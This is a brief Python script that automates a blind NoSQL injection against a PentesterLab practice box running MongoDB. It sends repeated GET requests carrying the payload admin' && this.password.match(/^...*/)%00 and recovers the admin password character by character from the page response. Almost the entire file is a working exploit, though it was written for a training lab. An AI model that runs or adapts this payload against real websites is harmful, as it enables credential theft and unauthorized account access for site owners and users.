#automate an exploit for websites using mongoDB. Initially created for use on a box on Pentesterlab
#author Drew Turner

import string
import requests

# ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
# ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
# digits = '0123456789'
# hexdigits = '0123456789abcdefABCDEF'
# octdigits = '01234567'
# printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
# punctuation = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
# whitespace = ' \t\n\r\x0b\x0c'

caseset = (string.hexdigits + "-")
password = ""
c = ""
url = "ptl-8e00bff4-c65e2d45.libcurl.st/"

while True:
    for c in caseset:
        resp = requests.get("http://{}?search=admin%27%20%26%26%20this.password.match(/^{}.*/)%00".format(url,password+c))
        #print("http://{}?search=admin%27%20%26%26%20this.password.match(/^{}.*/)%00".format(url,c))
        if ('>admin' in resp.text):
            password= password + c
            print (password)
            break
        else:
            pass
